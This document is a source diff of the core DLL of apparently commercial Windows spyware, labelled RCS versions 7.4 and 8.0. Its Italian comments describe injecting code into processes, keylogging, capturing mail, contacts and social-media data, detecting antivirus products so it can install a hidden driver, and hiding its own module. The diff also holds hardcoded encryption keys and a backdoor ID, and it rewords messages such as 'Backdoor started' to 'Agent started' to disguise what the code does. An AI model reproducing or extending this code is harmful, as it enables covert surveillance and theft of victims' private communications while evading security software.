@@ -22,7 +22,6 @@
 //
 ////////////////////////////////////////////////////////////////////////////////
 ////////////////////////////////////////////////////////////////////////////////
-
 #include "common.h" 
 #include "H4-DLL.h"	
 #include "demo_functions.h"
@@ -46,18 +45,28 @@
 #include "sha1.h"
 #include "status_log.h"
 
-
 #pragma bss_seg("shared")
+BOOL is_demo_version;
 BYTE crypt_key[KEY_LEN];		// Chiave di cifratura
 BYTE crypt_key_conf[KEY_LEN];   // Chiave di cifratura per la conf
 
 aes_context crypt_ctx;		// Context per la cifratura
 aes_context crypt_ctx_conf; // Context per la cifratura per la conf
 
+BOOL g_remove_driver;	// Indica se rimuovere o meno il driver sulla disinstallazione
 DWORD log_free_space;   // Spazio a disposizione per i log
-DWORD log_active_queue;  // Quale coda e' attiva 1 o 0
+DWORD log_active_queue; // Quale coda e' attiva 1 o 0
 DWORD process_bypassed; //Numero di processi da bypassare
 char process_bypass_list[MAX_DYNAMIC_BYPASS+EMBEDDED_BYPASS][MAX_PBYPASS_LEN]; // Lista dei processi su cui non fare injection
+DWORD social_process_control;	// Semaforo per controllare il processo "social"
+BOOL network_crisis;			// Se deve fermare le sync
+BOOL system_crisis;				// Se deve fermare i comandi e l'hiding
+BOOL bPM_IMStarted;				// Flag che indica se il monitor e' attivo o meno
+BOOL bPM_MailCapStarted;		// Indica se l'agente e' attivo o meno
+BOOL bPM_ContactsStarted;
+
+DWORD max_social_mail_len;		// Dimensione oltre la quale sega un messaggio di gmail
+
 // Nomi dei file di sistema.
 // Sono qui perche' ad esempio anche le funzioni di 
 // setup dei wrapper devono poterci accedere dall'interno
@@ -91,6 +100,7 @@ void HM_U2A(char *buffer);
 void LockConfFile();
 void UnlockConfFile();
 
+#include "JSON\JSON.h"
 #include "HM_ProcessMonitors.h" // XXX da modificare
 #include "HM_KeyLog.h" // XXX da modificare
 #include "HM_SnapShot.h" // XXX da modificare
@@ -110,17 +120,22 @@ void UnlockConfFile();
 #include "HM_Application.h" // XXX da modificare
 #include "HM_PDAAGent.h" // XXX da modificare
 #include "HM_Contacts.h" // XXX da modificare
+#include "HM_SocialAgent.h" // XXX da modificare
 
 // Qui finira' il binary patch con la chiave di cifratura dei log
-BYTE bin_patched_key[KEY_LEN] = "ngkdNGKDh4H4883";
+BYTE bin_patched_key[] = ENCRYPTION_KEY;
 // Qui finira' il binary patch con la chiave di cifratura per la conf
-BYTE bin_patched_key_conf[KEY_LEN] = "ngkdNGKDh4H4869";
+BYTE bin_patched_key_conf[] = ENCRYPTION_KEY_CONF;
+
+BYTE bin_patched_backdoor_id[] = BACKDOOR_ID;
 
 // Variabili di configurazione globali
 nanosec_time date_delta; // Usato per eventuali aggiustamenti sulla lettura delle date
 
 // Usata per lockare il file di conf
 HANDLE conf_file_handle = NULL;
+
+extern BOOL WINAPI DA_Uninstall(BYTE *dummy_param);
 
 typedef DWORD PROCESSINFOCLASS;
 typedef struct _SYSTEM_HANDLE_INFORMATION {
@@ -313,6 +328,69 @@ DWORD HM_RemoveCoreThread(void *dummy)
 	return 1;
 }
 
+BOOL IsLastInstance()
+{
+	WCHAR first_part[MAX_PATH];
+	WCHAR second_part[MAX_PATH];
+	WCHAR search_string[MAX_PATH];
+	WCHAR complete_path[MAX_PATH];
+	WCHAR *ptr = NULL;
+	WIN32_FIND_DATAW FindFileData;
+	HANDLE hFind = INVALID_HANDLE_VALUE, hFile;
+	DWORD instances = 0;
+
+	_snwprintf_s(first_part, MAX_PATH, _TRUNCATE, L"%S", H4_HOME_PATH);
+	if (ptr = wcschr(first_part, L'\\')) {
+		ptr++;
+		if (ptr = wcschr(ptr, L'\\')) {
+			ptr++;
+			*ptr = 0;
+			ptr++;
+		}
+	}
+	if (!ptr)
+		return FALSE;
+	_snwprintf_s(search_string, MAX_PATH, _TRUNCATE, L"%s*", first_part);
+	if (!(ptr = wcschr(ptr, L'\\')))
+		return FALSE;
+	ptr++;
+	_snwprintf_s(second_part, MAX_PATH, _TRUNCATE, L"%s", ptr);
+
+	hFind = FNC(FindFirstFileW)(search_string, &FindFileData);
+	if (hFind == INVALID_HANDLE_VALUE) 
+		return FALSE;
+	
+	do {
+		// Verifica se ci sono altre directory oltre alla nostra
+		if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
+			continue;
+		_snwprintf_s(complete_path, MAX_PATH, _TRUNCATE, L"%s%s\\%s", first_part, FindFileData.cFileName, second_part);
+		
+		if ((hFile = CreateFileW(complete_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, 0))!=INVALID_HANDLE_VALUE) {
+			instances++;
+			CloseHandle(hFile);
+		}
+
+	} while (FNC(FindNextFileW)(hFind, &FindFileData) != 0);
+	FNC(FindClose)(hFind);
+
+	if (instances>1)
+		return FALSE;
+
+	return TRUE;
+}
+
+// Rimuove il driver dal sistema 
+void HM_RemoveDriver()
+{
+	HideDevice reg_device;
+
+	// Rimuove le chiavi nel registry
+	reg_device.unhook_uninstall();
+
+	// Cancella il file del driver
+	RemoveSystemDriver();
+}
 
 // Inietta il thread in explorer per la cancellazione
 // del core. Se explorer non e' attivo, prova a iniettare
@@ -819,7 +897,6 @@ void __stdcall HM_sInBundleHook(DWORD dwPid, HMServiceStruct * pServiceData, BOO
 	// Metto gli Hook per tutti i PM inbundle...
 	// --- PM per Url Monitor
 	HMMAKE_HOOK(dwPid, "SendMessageW", PM_SendMessageURL, SendMessageURLData, PM_SendMessageURL_setup, pServiceData, "user32.dll"); 
-	HMMAKE_HOOK(dwPid, "PostMessageW", PM_PostMessageURL, SendMessageURLData, PM_PostMessageURL_setup, pServiceData, "user32.dll"); 
 	HMMAKE_HOOK(dwPid, "SetWindowTextW", PM_SetWindowText,  SendMessageURLData, PM_SetWindowText_setup,  pServiceData, "user32.dll"); 
 
 	// --- PM per Snapshot (on window creation)
@@ -1295,6 +1372,40 @@ DWORD HM_CreateProcessThread(void *dummy)
 	return 1;
 }
 
+BOOL CheckDemoVersion()
+{
+	char demo_tag[24];
+
+	memcpy(demo_tag, DEMO_TAG , sizeof(demo_tag));
+
+	if (demo_tag[0] != 'h') return FALSE;
+	if (demo_tag[1] != 'x') return FALSE;
+	if (demo_tag[2] != 'V') return FALSE;
+	if (demo_tag[3] != 't') return FALSE;
+	if (demo_tag[4] != 'd') return FALSE;
+	if (demo_tag[5] != 'x') return FALSE;
+	if (demo_tag[6] != 'J') return FALSE;
+	if (demo_tag[7] != '/') return FALSE;
+	if (demo_tag[8] != 'Z') return FALSE;
+	if (demo_tag[9] != '8') return FALSE;
+	if (demo_tag[10] != 'L') return FALSE;
+	if (demo_tag[11] != 'v') return FALSE;
+	if (demo_tag[12] != 'K') return FALSE;
+	if (demo_tag[13] != '3') return FALSE;
+	if (demo_tag[14] != 'U') return FALSE;
+	if (demo_tag[15] != 'L') return FALSE;
+	if (demo_tag[16] != 'S') return FALSE;
+	if (demo_tag[17] != 'n') return FALSE;
+	if (demo_tag[18] != 'K') return FALSE;
+	if (demo_tag[19] != 'R') return FALSE;
+	if (demo_tag[20] != 'U') return FALSE;
+	if (demo_tag[21] != 'm') return FALSE;
+	if (demo_tag[22] != 'L') return FALSE;
+	if (demo_tag[23] != 'E') return FALSE;
+
+	return TRUE;
+}
+
 //Riempie i campi relativi al nome del file immagine,
 //file di configurazione, directory di installazione.
 //Se torna FALSE non chiude niente, tanto il processo
@@ -1305,6 +1416,9 @@ BOOL HM_GuessNames()
 	char neutral_name[MAX_RAND_NAME];
 	char *ptr_offset;
 	
+	// Verifica se si tratta della versione demo o meno
+	is_demo_version = CheckDemoVersion();
+
 	if (!FindModulePath(path_name, sizeof(path_name)))
 		return FALSE;
 
@@ -1493,21 +1607,26 @@ void __stdcall HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_
 	// Cerca di "distrarre" la sandbox di kaspersky
 	HIDING();
 
+	HideDevice dev_probe;
+
 	// Decide se e dove copiare il driver 
 	// (Se c'e' ZoneAlarm E ctfmon NON mette il driver)
 	if ( (IsVista(&dummy) || IsAvira() || IsDeepFreeze() || IsBlink() || IsPGuard() || /*IsKaspersky() ||*/ IsMcAfee() || IsKerio() || IsComodo2() || IsComodo3() || IsPanda() || IsTrend() || IsZoneAlarm() || IsAshampoo() || IsEndPoint())
 		 && !(IsZoneAlarm() && HM_FindPid("ctfmon.exe", TRUE)) && !IsRising() && !IsADAware() && !IsSunBeltPF() && !IsSophos32() && (!IsPCTools() || IsDeepFreeze()) && (!IsKaspersky() || IsDeepFreeze())  && (!IsFSecure() || IsDeepFreeze())) {
 		WCHAR drv_path[DLLNAMELEN*2];
+		ZeroMemory(drv_path, sizeof(drv_path));
 
 		if (!HM_GuessNames()) {
 			ReportCannotInstall();
 			return;
 		}
 
-		// Copia il driver
-		if (!CopySystemDriver(drv_path)) {
-			ReportCannotInstall();
-			return;
+		// Copia il driver (solo se non c'e' gia')
+		if (!dev_probe.unhook_isdev()) {
+			if (!CopySystemDriver(drv_path)) {
+				ReportCannotInstall();
+				return;
+			}
 		}
 
 		HideDevice dev_unhook(drv_path);
@@ -1523,7 +1642,7 @@ void __stdcall HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_
 
 		// Se c'e' deep freeze copia il core e il driver sul disco "reale"
 		if (IsDeepFreeze()) {
-			if (DFFixCore(&dev_unhook, (unsigned char *)H4DLLNAME, (unsigned char *)H4_HOME_PATH, (unsigned char *)REGISTRY_KEY_NAME)) {
+			if (DFFixCore(&dev_unhook, (unsigned char *)H4DLLNAME, (unsigned char *)H4_HOME_PATH, (unsigned char *)REGISTRY_KEY_NAME, FALSE)) {
 				PVOID old_value = DisableWow64Fs();
 				DFFixDriver(&dev_unhook, drv_path);
 				RevertWow64Fs(old_value);
@@ -1680,6 +1799,24 @@ BOOL HM_GetDate(nanosec_time *time)
 	return TRUE;
 }
 
+BOOL HM_HourStringToMillisecond(const WCHAR *time_string, DWORD *millisecond)
+{
+	DWORD hour, minute, second;
+	swscanf_s(time_string, L"%d:%d:%d", &hour, &minute, &second); 
+	*millisecond = ((((hour*60) + minute)*60) + second)*1000;
+	return TRUE;
+}
+
+BOOL HM_TimeStringToFileTime(const WCHAR *time_string, FILETIME *ftime)
+{
+	SYSTEMTIME stime;
+
+	ZeroMemory(&stime, sizeof(stime));
+	swscanf_s(time_string, L"%d-%d-%d %d:%d:%d", &stime.wYear, &stime.wMonth, &stime.wDay, &stime.wHour, &stime.wMinute, &stime.wSecond); 
+
+	return SystemTimeToFileTime(&stime, ftime);
+}
+
 // Inserisce la chiave nel registry per l'avvio automatico
 void HM_InsertRegistryKey(char *dll_name, BOOL force_insert)
 {
@@ -1783,12 +1920,6 @@ void HM_RemoveRegistryKey()
 #endif
 }
 
-// Fa proprio quello che dice il nome
-void HM_RemoveDriver()
-{
-	UninstallDriver();
-}
-
 // Ritorna il puntatore a dopo una stringa trovata in memoria
 char *HM_memstr(char *memory, char *string)
 {
@@ -1889,23 +2020,23 @@ void HM_WipeFileW(WCHAR *file_name)
 // Verifica se c'e' una copia integra del file di configurazione.
 // Se e' integra la rimpiazza sull'originale. In ogni caso la cancella (se esiste).
 // Se rimpiazza l'originale ritorna TRUE.
-BOOL HM_CheckNewConf() 
+BOOL HM_CheckNewConf(char *conf_file_name) 
 {
 	HANDLE h_conf_file;
-	BYTE *clear_file;
+	char *clear_file;
 	char conf_path[DLLNAMELEN];
 	char orig_conf_path[DLLNAMELEN];
 
-	h_conf_file = FNC(CreateFileA)(HM_CompletePath(H4_CONF_BU, conf_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+	h_conf_file = FNC(CreateFileA)(HM_CompletePath(conf_file_name, conf_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 	// Se non trova nessun file di backup ritorna (lo considera inesistente)
 	if (h_conf_file == INVALID_HANDLE_VALUE)
 		return FALSE;
 	CloseHandle(h_conf_file);
 
 	// Verifica che il file sia integro e decifrabile correttamente
-	clear_file = HM_ReadClearConf(H4_CONF_BU);
+	clear_file = HM_ReadClearConf(conf_file_name);
 	if (!clear_file) {
-		HM_WipeFileA(HM_CompletePath(H4_CONF_BU, conf_path));
+		HM_WipeFileA(HM_CompletePath(conf_file_name, conf_path));
 		return FALSE;
 	}
 	SAFE_FREE(clear_file);
@@ -1914,12 +2045,12 @@ BOOL HM_CheckNewConf()
 	// Procede quindi alla copia su quello originale.
 	// Se fallisce la copia non cancella il backup (lo copiera' al prossimo avvio).
 	UnlockConfFile();
-	if (!FNC(CopyFileA)(HM_CompletePath(H4_CONF_BU, conf_path), HM_CompletePath(H4_CONF_FILE, orig_conf_path), FALSE))
+	if (!FNC(CopyFileA)(HM_CompletePath(conf_file_name, conf_path), HM_CompletePath(H4_CONF_FILE, orig_conf_path), FALSE))
 		return FALSE;
 	LockConfFile();
 
 	// La copia e' riuscita, quindi cancella il file di backup e torna TRUE.
-	HM_WipeFileA(HM_CompletePath(H4_CONF_BU, conf_path));
+	HM_WipeFileA(HM_CompletePath(conf_file_name, conf_path));
 
 	// Nel caso ci sia DeepFreeze, fixa il file di destinazione sul disco reale
 	if (IsDeepFreeze()) {
@@ -1932,26 +2063,22 @@ BOOL HM_CheckNewConf()
 	return TRUE;
 }
 
-
 // Ritorna una zona di memoria con il file di configurazione
 // in chiaro. Va liberata!!!. Torna NULL se fallisce.
-BYTE *HM_ReadClearConf(char *conf_name)
+#define AES_BLOCK_LEN 16
+#define MINIMUM_CONF_LEN (SHA_DIGEST_LENGTH+AES_BLOCK_LEN)
+char *HM_ReadClearConf(char *conf_name)
 {
-	HANDLE h_conf_file, h_map = 0;
-	BYTE *conf_memory = NULL;
-	BYTE *conf_memory_clear = NULL;
-	DWORD conf_len = INVALID_FILE_SIZE;
-	DWORD *conf_clear_len;
-	DWORD *file_crc;
-	DWORD temp_len;
-	DWORD end_len;
-	char conf_path[DLLNAMELEN];
 	BYTE iv[BLOCK_LEN];
-	char *ptr;
-	DWORD conf_hash;
-	long long temp_hash;
+	char *conf_memory_clear = NULL;
+	DWORD conf_len = INVALID_FILE_SIZE;
+	BYTE *conf_memory = NULL;
+	HANDLE h_conf_file, h_map = 0;
+	char conf_path[DLLNAMELEN];
+	BYTE crc[SHA_DIGEST_LENGTH];
+	BOOL crc_ok = FALSE;
+	DWORD pad_len;
 
-	end_len = strlen(ENDOF_CONF_DELIMITER) + sizeof(DWORD); // tag di fine piu' CRC
 	// Mappa per comodita' il file di configurazione nella memoria
 	h_conf_file = FNC(CreateFileA)(HM_CompletePath(conf_name, conf_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 	if (h_conf_file != INVALID_HANDLE_VALUE && (h_map = FNC(CreateFileMappingA)(h_conf_file, NULL, PAGE_READONLY, 0, 0, NULL))) {
@@ -1960,14 +2087,14 @@ BYTE *HM_ReadClearConf(char *conf_name)
 	}
 	
 	// Crea una copia in chiaro in memoria
-	if (conf_memory && conf_len!=INVALID_FILE_SIZE && conf_len >= (CLEAR_CONF_LEN + sizeof(DWORD) + end_len)) {
+	if (conf_memory && conf_len!=INVALID_FILE_SIZE && conf_len>MINIMUM_CONF_LEN) {
 		// Alloca la memoria 
-		conf_memory_clear = (BYTE *)malloc(conf_len);
+		conf_memory_clear = (char *)malloc(conf_len);
 		if (conf_memory_clear) {
 			// Decifra il file di conf (assume che la parte cifrata sia gia' stata
 			// paddata).
 			memset(iv, 0, sizeof(iv));
-			aes_cbc_decrypt(&crypt_ctx_conf, iv, conf_memory + CLEAR_CONF_LEN, conf_memory_clear, conf_len - CLEAR_CONF_LEN);
+			aes_cbc_decrypt(&crypt_ctx_conf, iv, conf_memory, (BYTE *)conf_memory_clear, conf_len);
 		}	
 	}
 	
@@ -1979,53 +2106,136 @@ BYTE *HM_ReadClearConf(char *conf_name)
 	if (h_conf_file != INVALID_HANDLE_VALUE)
 		CloseHandle(h_conf_file);
 
-	// Verifica che tutto sia stato decifrato correttamente
-	// (altrimenti non torna niente)
-	if (conf_memory_clear) {
-		// Verifica la lunghezza
-		conf_clear_len = (DWORD *)conf_memory_clear;
-		temp_len = *conf_clear_len;
-		if (temp_len % BLOCK_LEN) {
-			temp_len /= BLOCK_LEN;
-			temp_len++;
-			temp_len *= BLOCK_LEN;
-		}
-		if (temp_len + CLEAR_CONF_LEN != conf_len) {
-			SAFE_FREE(conf_memory_clear);
-			return NULL;
-		}
-		if ( (*conf_clear_len) < end_len) {
-			SAFE_FREE(conf_memory_clear);
-			return NULL;
-		}
+	if (!conf_memory_clear)
+		return NULL;
 
-		// Check della stringa di fine file (riutilizzo la variabile)
-		conf_memory = conf_memory_clear + (*conf_clear_len) - end_len;
-		if (memcmp(ENDOF_CONF_DELIMITER, conf_memory, strlen(ENDOF_CONF_DELIMITER)) != 0) {
-			SAFE_FREE(conf_memory_clear);
-			return NULL;
-		}
+	// Elimina il padding
+	pad_len = conf_memory_clear[conf_len-1];
+	if (pad_len>AES_BLOCK_LEN) {
+		SAFE_FREE(conf_memory_clear);
+		return NULL;
+	}
 
-		// Controlla il CRC (viene fatto su tutta la parte cifrata, togliendo il CRC stesso)
-		temp_hash = 0;
-		ptr = (char *)conf_memory_clear;
-		for (DWORD i=0; i<(*conf_clear_len)-sizeof(DWORD); i++) {
-			temp_hash++;
-			if (*ptr)
-				temp_hash *= (*ptr);
-			conf_hash = (DWORD)(temp_hash >> 32);
-			temp_hash &= 0xFFFFFFFF;
-			temp_hash ^= conf_hash;
-			ptr++;
-		}
-		conf_hash = (DWORD)temp_hash;
-		file_crc = (DWORD *)(conf_memory_clear + (*conf_clear_len) - sizeof(DWORD));
-		if (*file_crc != conf_hash) {
-			SAFE_FREE(conf_memory_clear);
-			return NULL;
+	// Check del CRC
+	SHA1Context sha;
+	SHA1Reset(&sha);
+	SHA1Input(&sha, (const unsigned char *)conf_memory_clear, conf_len - SHA_DIGEST_LENGTH - pad_len);
+	if (SHA1Result(&sha)) {
+		for (int i=0; i<5; i++)
+			sha.Message_Digest[i] = ntohl(sha.Message_Digest[i]);
+		memcpy(crc, sha.Message_Digest, SHA_DIGEST_LENGTH);
+		if (!memcmp(crc, conf_memory_clear + conf_len - SHA_DIGEST_LENGTH - pad_len, SHA_DIGEST_LENGTH))
+			crc_ok = TRUE;
+	}
+
+	if (!crc_ok) {
+		SAFE_FREE(conf_memory_clear);
+		return NULL;
+	}
+
+	// NULL termina la stringa azzerando il CRC
+	memset(conf_memory_clear + conf_len - SHA_DIGEST_LENGTH - pad_len, 0, SHA_DIGEST_LENGTH);
+
+	return conf_memory_clear;
+}
+
+// Passa alla callback tutti i sotto-oggetti dell'oggetto "section" nella configurazione json
+typedef void (WINAPI *conf_callback_t)(JSONObject, DWORD counter);
+BOOL HM_ParseConfSection(char *conf, WCHAR *section, conf_callback_t call_back)
+{
+	JSONValue *value;
+	JSONObject root;
+	DWORD counter = 0;
+
+	value = JSON::Parse(conf);
+	if (!value)
+		return FALSE;
+	if (value->IsObject() == false) {
+		delete value;
+		return FALSE;
+	}
+	root = value->AsObject();
+
+	if (root.find(section) != root.end() && root[section]->IsArray()) {
+		JSONArray jarray = root[section]->AsArray();
+		for (unsigned int i = 0; i < jarray.size(); i++) {
+			if (jarray[i]->IsObject()) 
+				call_back(jarray[i]->AsObject(), counter++);
 		}
 	}
-	return conf_memory_clear;
+	delete value;
+	return TRUE;
+}
+
+// Passa l'oggetto json delle globals
+BOOL HM_ParseConfGlobals(char *conf, conf_callback_t call_back)
+{
+	JSONValue *value;
+	JSONObject root, obj;
+
+	value = JSON::Parse(conf);
+	if (!value)
+		return FALSE;
+	if (value->IsObject() == false) {
+		delete value;
+		return FALSE;
+	}
+	root = value->AsObject();
+
+	if (!root[L"globals"]->IsObject()) {
+		delete value;
+		return FALSE;
+	}
+	obj = root[L"globals"]->AsObject();
+	call_back(obj, 0);
+
+	delete value;
+	return TRUE;
+}
+
+BOOL HM_CountConfSection(char *conf, WCHAR *section, DWORD *count)
+{
+	JSONValue *value;
+	JSONObject root;
+
+	*count = 0;
+	value = JSON::Parse(conf);
+	if (!value)
+		return FALSE;
+	if (value->IsObject() == false) {
+		delete value;
+		return FALSE;
+	}
+	root = value->AsObject();
+
+	if (root.find(section) != root.end() && root[section]->IsArray()) {
+		JSONArray jarray = root[section]->AsArray();
+		*count = jarray.size();
+	}
+	delete value;
+	if (*count != 0)
+		return TRUE;
+	return FALSE;
+}
+
+
+void WINAPI ParseBypassCallback(JSONObject conf_json, DWORD dummy)
+{
+	DWORD index;
+	JSONArray bypass_array = conf_json[L"nohide"]->AsArray();
+	process_bypassed = bypass_array.size();
+	if (process_bypassed > MAX_DYNAMIC_BYPASS)
+		process_bypassed = MAX_DYNAMIC_BYPASS;
+	process_bypassed += EMBEDDED_BYPASS; // Inserisce i processi hardcoded
+
+	// Legge i processi rimanenti dal file di configurazione
+	for (index=0; index<bypass_array.size(); index++) 
+		_snprintf_s(process_bypass_list[index+EMBEDDED_BYPASS], MAX_PBYPASS_LEN, _TRUNCATE, "%S", bypass_array[index]->AsString().c_str());
+}
+
+void WINAPI ParseDriverHandling(JSONObject conf_json, DWORD dummy)
+{
+	g_remove_driver = (BOOL) conf_json[L"remove_driver"]->AsBool();
 }
 
 
@@ -2035,7 +2245,7 @@ void HM_UpdateGlobalConf()
 	HANDLE h_conf_file;
 	DWORD readn;
 	char conf_path[DLLNAMELEN];
-	BYTE *conf_memory;
+	char *conf_memory;
 
 	// Se non riesce a leggere la configurazione, inizializza comunque
 	// i valori globali.
@@ -2076,34 +2286,13 @@ void HM_UpdateGlobalConf()
 	// Legge il delta date dal file di stato...
 	Log_RestoreAgentState(PM_CORE, (BYTE *)&date_delta, sizeof(date_delta)); 
 
-	// Legge la lista dei processi da bypassare 
+	// Legge la lista dei processi da bypassare e la gestione del driver
 	conf_memory = HM_ReadClearConf(H4_CONF_FILE);
-	
-	// Effettua il parsing del file di configurazione mappato
-	// XXX Non c'e' il controllo che conf_ptr possa uscire fuori dalle dimensioni del file mappato
-	// (viene assunto che la configurazione sia coerente e il file integro)
 	if (conf_memory) {
-		DWORD index, param_len;
-		BYTE *conf_ptr;
-
-		// conf_ptr si sposta nel file durante la lettura
-		conf_ptr = (BYTE *)HM_memstr((char *)conf_memory, BYPAS_CONF_DELIMITER);
-
-		// ---- Configurazione process bypass ----
-		READ_DWORD(process_bypassed, conf_ptr);
-		if (process_bypassed > MAX_DYNAMIC_BYPASS)
-			process_bypassed = MAX_DYNAMIC_BYPASS;
-		process_bypassed += EMBEDDED_BYPASS; // Inserisce i processi hardcoded
-
-		// Legge i processi rimanenti dal file di configurazione
-		for (index=EMBEDDED_BYPASS; index<process_bypassed; index++) {
-			READ_DWORD(param_len, conf_ptr);
-			// Il nome dei processi deve essere NULL terminated
-			_snprintf_s(process_bypass_list[index], MAX_PBYPASS_LEN, _TRUNCATE, "%s", (char *)conf_ptr);
-			conf_ptr += param_len;
-		}
-		SAFE_FREE(conf_memory);
+		HM_ParseConfGlobals(conf_memory, &ParseBypassCallback);
+		HM_ParseConfGlobals(conf_memory, &ParseDriverHandling);
 	}
+	SAFE_FREE(conf_memory);
 }
 
 
@@ -2147,6 +2336,16 @@ BOOL HM_GetDefaultBrowser(char *path_name)
 
 	// Lo mette tra "" per evitare ambiguita' alla CreateProcess
 	sprintf(path_name, "\"%s\"", unquoted_long_path);
+	return TRUE;
+}
+
+// Prende il path di IE32
+BOOL HM_GetIE32Browser(char *path_name)
+{
+	if (GetEnvironmentVariableA("ProgramFiles(x86)", path_name, DLLNAMELEN) == 0)
+		return FALSE;
+
+	StrCat(path_name, "\\Internet Explorer\\iexplore.exe");
 	return TRUE;
 }
 
@@ -2449,20 +2648,18 @@ void __stdcall HM_sMain(void)
 {
 	pid_hide_struct pid_hide;
 
+	//Riempie i campi relativi al nome del file immagine,
+	//file di configurazione, directory di installazione
+	//etc. Va fatta come PRIMA cosa.
+	if (!HM_GuessNames()) 
+		FNC(ExitProcess)(0);
+
 	// Tutte le funzioni di logging sono attive solo
 	// nella versione demo
 	if (!CreateLogWindow())
 		FNC(ExitProcess)(0);
 
-	REPORT_STATUS_LOG("- Checking modules..............");
-	//Riempie i campi relativi al nome del file immagine,
-	//file di configurazione, directory di installazione
-	//etc. Va fatta come PRIMA cosa.
-	if (!HM_GuessNames()) {
-		REPORT_STATUS_LOG("ERROR\r\n    30112 [Cannot locate RCS core module]\r\n"); 
-		ReportExitProcess();
-	}
-	REPORT_STATUS_LOG("OK\r\n"); 
+	REPORT_STATUS_LOG("- Checking components...........");
 
 	// Locka il file di configurazione per prevenire cancellazioni "accidentali"
 	LockConfFile();
@@ -2471,6 +2668,8 @@ void __stdcall HM_sMain(void)
 	// XXX da qui in poi non potro' piu' fare GetModuleHandle etc. di questo modulo
 	HidePEB(GetModuleHandle(H4DLLNAME));
 
+	REPORT_STATUS_LOG("OK\r\n"); 
+
 	// Cancella la command line
 	HM_ClearCommand();
 
@@ -2478,7 +2677,7 @@ void __stdcall HM_sMain(void)
 
 	// Toglie gli hook, prende i privilegi, etc.
 	if (!doUnhook()) {
-		REPORT_STATUS_LOG("ERROR\r\n    17240 [Unable to bypass protection systems]\r\n"); 
+		REPORT_STATUS_LOG("ERROR\r\n    17240 [Unable to deploy]\r\n"); 
 		ReportExitProcess();
 	} 
 	REPORT_STATUS_LOG("OK\r\n"); 
@@ -2491,17 +2690,19 @@ void __stdcall HM_sMain(void)
 	// o corrotto (lo rimpiazza con l'eventuale copia di backup).
 	// Va fatto prima di AM_Startup, perche' quest'ultima legge
 	// gia' il file di configurazione.
-	HM_CheckNewConf();
+	HM_CheckNewConf(H4_CONF_BU);
+	HM_CheckNewConf("nc-7-8dv.cfg");
 
 	// Legge le configurazioni globali. Va fatto DOPO HM_CheckNewConf.
 	HM_UpdateGlobalConf();
 	
 	// L'agent manager deve essere startato prima di effettuare gli hook 
 	// (infatti e' lui che inizializza tutta la parte di IPC).
-	REPORT_STATUS_LOG("- Initializing agents...........");
+	REPORT_STATUS_LOG("- Initializing modules..........");
 	if (!AM_Startup()) {
-		REPORT_STATUS_LOG("ERROR\r\n    29310 [The system is already infected]\r\n"); 
-		ReportExitProcess(); // AM_Startup fallisce se la sharedmemory gia' esiste
+		REPORT_STATUS_LOG("ERROR\r\n    29310 [The system is already monitored]\r\n"); 
+		g_remove_driver = FALSE; // Disinstalla questa istanza ma lascia il driver per eventuali altre istanze running
+		DA_Uninstall(NULL); // AM_Startup fallisce se la sharedmemory gia' esiste
 	}
 	REPORT_STATUS_LOG("OK\r\n"); 
 
@@ -2536,8 +2737,8 @@ void __stdcall HM_sMain(void)
 	// Fa partire il sync manager 
 	SM_StartMonitorEvents();
 
-	REPORT_STATUS_LOG("\r\n RCSv7.4 fully operational\r\n\r\n");
-	SendStatusLog(L"[Core Module]: Backdoor started");
+	REPORT_STATUS_LOG("\r\n Version 8.0 fully operational\r\n\r\n");
+	SendStatusLog(L"[Core Module]: Agent started");
 
 	// Ciclo per l'hiding da task manager e dai nuovi epxlorer
 	// lanciati. Monitora anche la coda dei messaggi per
